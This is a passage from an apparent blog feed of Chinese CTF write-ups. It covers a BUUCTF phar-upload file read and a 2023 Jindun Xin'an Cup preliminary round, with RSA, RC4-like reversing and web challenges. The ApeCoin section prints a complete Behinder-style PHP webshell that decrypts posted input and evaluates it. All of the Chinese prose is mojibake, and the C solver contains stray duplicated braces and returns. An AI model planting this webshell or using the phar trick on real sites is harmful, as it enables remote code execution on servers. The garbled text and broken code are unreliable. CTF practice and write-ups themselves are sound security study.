<p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹ä¸ºpngæ–‡ä»¶åç¼€ç„¶åä¸Šä¼ <br><img src="https://img-blog.csdnimg.cn/direct/98a7438692fc4e4e80047777d1b117cf.png" alt="456"><br>ç„¶åè®¿é—®uploadæ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/direct/2949540fb11e4deb8a55e9fb6f71a348.png" alt="123"><br>ä½¿ç”¨pharåè®®è¯»å–æ–‡ä»¶<br><code>http://38b4a3d2-8682-421d-91a5-7adf667005a3.node4.buuoj.cn:81/file.php?file=phar://upload/a8814e077fc8a92d25a18efa7c4d87ec.jpg</code><br><img src="https://img-blog.csdnimg.cn/direct/d0894769fb9340acbfb61b581e2af7d6.png" alt="789"><br>å°†å¾—åˆ°çš„æºç è¿›è¡Œbase64è§£å¯†æ‹¿åˆ°flag</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023é‡‘ç›¾ä¿¡å®‰æ¯åˆèµ›wp</title>
    <url>/2023/11/27/2023%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬äºŒæ¬¡å‚åŠ é‡‘ç›¾ä¿¡å®‰æ¯äº†ï¼Œè®°å¾—å»å¹´å‚åŠ æ˜¯åœ¨å¯’å‡ï¼Œç”±äºâ€œå£ç½©åŸå› â€å­¦æ ¡æ”¾å‡æ—©ï¼Œåœ¨è¿›è¡Œå®Œç¬¬äºŒæ¬¡è€ƒæ ¸ä¹‹åå°±å›å®¶äº†ï¼Œå½“æ—¶ä¹Ÿæ²¡æœ‰å­¦åˆ°ä»€ä¹ˆã€‚å›åˆ°å®¶ç”±äºçŸ¥é“è‡ªå·±è¦å‚åŠ ç¬¬ä¸€æ¬¡çœçº§èµ›äº‹ï¼Œä¸æ•¢åˆ’æ°´äº†ã€‚ã€‚ã€‚<br>ç¬¬ä¸€æ¬¡å‚åŠ çš„æ—¶å€™åº”è¯¥ä¹Ÿæ˜¯8ä¸ªå°æ—¶ï¼ˆå…·ä½“è®°ä¸æ¸…äº†ï¼‰ï¼Œæˆ‘çŸ¥é“ï¼Œæˆ‘æ˜¯çœŸçš„åšä¸å‡ºæ¥é¢˜ç›®ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯æ··äº†ä¸€ä¸ªä¸‰ç­‰å¥–ã€‚<br>ä»Šå¹´å†æ¬¡å‚åŠ ï¼Œæœ¬ä»¥ä¸ºä¼šæœ‰ä¸€ä¸ªä¸é”™çš„æˆç»©ï¼Œå¯æ˜¯ä»æ¯”èµ›åæ¬¡ä¸Šä¹Ÿçœ‹å‡ºæ¥äº†è‡ªå·±è¿˜æœ‰å¾ˆå¤šä¸è¶³ï¼Œä¸ç®—å¾ˆé«˜ä½†ä¹Ÿä¸æ˜¯å¾ˆä½ï¼ˆæ··äº†ä¸€ä¸ªä¸€ç­‰ï¼‰ï¼Œæ€»æ„Ÿè§‰è‡ªå·±åœ¨å¾ˆå¤šæ–¹é¢è¿˜å¾ˆæ¬ ç¼ºï¼Œç»§ç»­åŠªåŠ›å§ï¼ï¼ï¼ï¼<br><img src="http://img-blog.csdnimg.cn/9810cd7ef58a439d83955da8bbfee715.png" alt="123"></p>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Hakiehs"><a href="#Hakiehs" class="headerlink" title="Hakiehs"></a>Hakiehs</h4><p>å°†attachment.vsdxæ–‡ä»¶åç¼€æ”¹ä¸ºzipæ–‡ä»¶ç„¶åè§£å‹ï¼Œåœ¨æ–‡ä»¶é‡Œæ‰¾åˆ°è¿™ä¸ªå›¾ç‰‡<br><img src="http://img-blog.csdnimg.cn/b36eda2e38044c96a48e93abe63eda66.png" alt="132"><br>ä»ä¸Šåˆ°ä¸‹åˆ†åˆ«ä¸ºbotwã€GERUDOã€æ¨Šå‡¡è¯­<br><img src="http://img-blog.csdnimg.cn/d8573ea45667465daf701c0bc0fef025.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/f9e6f7ccb8364b968ba4b47b60bc55aa.png" alt="789"><br><img src="http://img-blog.csdnimg.cn/953ac6ba3cdb4453b4e1b2bbe784ba41.png" alt="789"><br>åˆ†åˆ«æ‰¾å‡ºå¯¹åº”çš„å­—æ¯<br>linkzeldaganon</p>
<h4 id="æ¥éƒ½æ¥äº†"><a href="#æ¥éƒ½æ¥äº†" class="headerlink" title="æ¥éƒ½æ¥äº†"></a>æ¥éƒ½æ¥äº†</h4><p><img src="http://img-blog.csdnimg.cn/ef40a915046f4e6c86bc91ca8d551122.png" alt="456"></p>
<p>é™„ä»¶æ‰“å¼€ç›´æ¥å¼¹å‡ºå¯†ç ï¼Œæ‹–è¿›winhexé‡Œçœ‹æ˜¯ä¼ªåŠ å¯†ï¼Œå°†æ ‡å¿—ä½æ”¹æˆ00 00<br><img src="http://img-blog.csdnimg.cn/96011ab1639a469baf75a71dc8dfc076.png" alt="789"><br>å¦å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°ä¸€æ®µtxtæ–‡æœ¬æ–‡ä»¶<br><img src="http://img-blog.csdnimg.cn/35b002e18f4d4fc2b4137c7700f1d4a9.png" alt="789"><br>æ€€ç–‘æ˜¯base64è¿›è¡Œè§£å¯†åå‘ç°å¥½åƒæ˜¯ä¸€æ®µå­—ç¬¦ä¸²<br><img src="http://img-blog.csdnimg.cn/0e11ccaf0efc49ba871ad0eb61ab7c33.png" alt="123"><br>å¤åˆ¶ä¸‹æ¥åæ‹–è¿›è®°äº‹æœ¬ç¼©å°å­—ä½“å¾—åˆ°flag<br><img src="http://img-blog.csdnimg.cn/4dfefa8465334102949f8ab0e9ca822d.png" alt="789"><br>flag{cp2ae315-eef4-3fra-a768-cd9xb19cdk4e}</p>
<h4 id="èŠ™å®å¨œ"><a href="#èŠ™å®å¨œ" class="headerlink" title="èŠ™å®å¨œ"></a>èŠ™å®å¨œ</h4><p>æ‰“å¼€å›¾ç‰‡è¿›è¡Œå°†å…¶ä¸­å›¾ç‰‡ä¸­çš„base64ç¼–ç è¿›è¡Œè§£ç <br><img src="http://img-blog.csdnimg.cn/585800fcd81a469d9c778da2a9e57855.png" alt="798"><br>ç”±äºè¿™ä¸ªflagçš„æ ¼å¼æ˜¯uuid</p>
<blockquote>
<p>æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶å°¾éƒ¨è¿˜å·®4ä¸ªå­—ç¬¦ï¼Œæ­¤æ—¶æˆ‘ä»¬è¿˜æ²¡æœ‰æƒ³åˆ°çˆ†ç ´flagï¼Œå°±æ˜¯å…ˆæ‰¾åˆ°å¦å¤–çš„è§£æ³•ï¼Œä½†æ˜¯å½“æ—¶ä¸€ä½é˜Ÿå‘˜å°è¯•çˆ†ç ´å4ä½å­—ç¬¦ï¼ˆåˆ¶ä½œå­—å…¸ï¼ŒæŠ“åŒ…çˆ†ç ´ï¼ŒçœŸçš„æ˜¯å¯è¡Œçš„ï¼‰ï¼Œæœ€ç»ˆå¾—åˆ°äº†æ­£ç¡®ç­”æ¡ˆ8e8fï¼ˆç”±äºæ¯”èµ›å·²ç»ç»“æŸï¼Œç°åœ¨æ— æ³•æ ¹æ®è¿”å›åŒ…åˆ¤æ–­ï¼‰<br><img src="http://img-blog.csdnimg.cn/772acfeb19ac44b891619d64039af44f.png" alt="456"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="æˆ‘çœ‹çœ‹è°è¿˜ä¸ä¼šRSA"><a href="#æˆ‘çœ‹çœ‹è°è¿˜ä¸ä¼šRSA" class="headerlink" title="æˆ‘çœ‹çœ‹è°è¿˜ä¸ä¼šRSA"></a>æˆ‘çœ‹çœ‹è°è¿˜ä¸ä¼šRSA</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> secret

m <span class="token operator">=</span> secret<span class="token punctuation">.</span>flag
p<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>
q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">37777</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token comment"># c = 8232151627233115772131180151146951323147507324390914513031444555762539986162650</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å†™å¦‚ä¸‹è„šæœ¬è¿è¡Œå¾—åˆ°dã€mçš„æ•°å€¼ï¼Œå¾—åˆ°çš„då€¼å†èµ‹å€¼ç»™eé‡æ–°è¿è¡Œå¾—åˆ°flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp
<span class="token keyword">import</span> binascii

p<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>
q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>
e<span class="token operator">=</span><span class="token number">37777</span>
c<span class="token operator">=</span><span class="token number">8232151627233115772131180151146951323147507324390914513031444555762539986162650</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="http://img-blog.csdnimg.cn/288c7d52921046af860a8d8f571e84e3.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/d969fd08383c44edac8ad4eae731fc26.png" alt="789"><br>flag{r5a_Who_w0nt}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h4><p><img src="http://img-blog.csdnimg.cn/093d81a015d24558aad13b7f06d521c5.png" alt="789"><br>å‘ç°æ˜¯64ä½ï¼Œäºæ˜¯æ‹–åˆ°64ä½idaé‡Œé¢<br>æ‰¾åˆ°mainå‡½æ•°è¿›è¡ŒF5åç¼–è¯‘å¾—åˆ°å¦‚ä¸‹ä»£ç <br><img src="http://img-blog.csdnimg.cn/c4c2c01e1cba4c8f8526f3546eae7ab4.png" alt="789"><br>è·Ÿè¿›å…³é”®å‡½æ•°sub_401AD0(v6);æ¥ç€è·Ÿè¿›sub_401850(Block);<br><img src="http://img-blog.csdnimg.cn/35c5af22280e443aa219c8d4ace47f16.png" alt="789"><br>V9ä¸ºå¯†æ–‡ï¼Œä¸Šé¢çš„&amp;unk_473040,ä¸­æœ‰ä¸€äº›å¥‡æ€ªçš„æ•°æ®ï¼ŒæŒ‰Cè½¬æ±‡ç¼–ä»£ç å<br><img src="http://img-blog.csdnimg.cn/a6e6b03bcdde412d9bad06f146e75874.png" alt="789"><br>é€‰ä¸­æ±‡ç¼–ä»£ç Påˆ›å»ºå‡½æ•°F5åç¼–è¯‘<br><img src="http://img-blog.csdnimg.cn/70064fc4a12a4550aa9cb655d43766d3.png" alt="789"><br>åˆ†æå‘ç°æ˜¯ç±»RC4è§£å¯†ç®—æ³•ï¼Œå°†é¢˜ç›®ç»™çš„å¯†æ–‡ç”¨è¿™æ®µä»£ç è§£å¯†å¾—åˆ°flagã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>

    <span class="token keyword">void</span>  <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> k<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> v3<span class="token punctuation">[</span><span class="token number">515</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v4<span class="token punctuation">;</span>
    <span class="token keyword">char</span> v5<span class="token punctuation">;</span>
    <span class="token keyword">int</span> j<span class="token punctuation">;</span>
    <span class="token keyword">int</span> v7<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v7 <span class="token operator">=</span> <span class="token punctuation">(</span>v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">+</span> v7 <span class="token operator">+</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v5 <span class="token operator">+=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v5 <span class="token operator">^=</span> v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token punctuation">(</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    k <span class="token operator">=</span> v5 <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^=</span> k<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> mm <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span>
    <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span>
    <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x2A</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//æå–çš„å°±æ˜¯v9çš„å€¼</span>
    <span class="token function">aaa</span><span class="token punctuation">(</span> v9<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> v9<span class="token punctuation">[</span>mm <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œå¾—åˆ°flag<br><img src="http://img-blog.csdnimg.cn/59c9d9cd25f94cc18d4b1a10a022e762.png" alt="789"><br>flag{ ca1acd0c7d7111eeaf0296085339ce83}</p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p><img src="http://img-blog.csdnimg.cn/11f29ca65c4a4675add1d19f55fc2e94.png" alt="456"></p>
<p>éé¢„æœŸï¼šè®¿é—®&#x2F;flagå°±å¯ä»¥å¾—åˆ°flag<br><img src="http://img-blog.csdnimg.cn/baf9550358a94843928d68e9faaa9172.png" alt="456"><br>flag{68cfa555-80e7-4cee-a85a-4c59826862b0}</p>
<h4 id="ApeCoin"><a href="#ApeCoin" class="headerlink" title="ApeCoin"></a>ApeCoin</h4><p>dirsearchæ‰«æç›®å½•æ‰«åˆ°å‹ç¼©åŒ…æ–‡ä»¶<a href="http://www.tar.gz,åŒæ—¶è®¿é—®/robots.txt">www.tar.gzï¼ŒåŒæ—¶è®¿é—®/robots.txt</a><br><img src="http://img-blog.csdnimg.cn/c348b9bd83774840bc6fdbf3aa0c2d15.png" alt="456"><br>è®¿é—®see_see_thisï¼Œå‘ç°ä¹±ç <br><img src="http://img-blog.csdnimg.cn/71b37c6310a74636a88fdaa38e014b22.png" alt="789"><br>æ”¹å˜ç¼–ç ä¹‹åå¦‚ä¸‹<br><img src="http://img-blog.csdnimg.cn/90a8b04cbee044c78ec745e38ffecb9e.png" alt="789"><br>åœ¨ç¿»æ‰¾æºä»£ç æ—¶å‘ç°å†°èphpé©¬</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"13e40b614fcb3e19"</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>
        <span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
                <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
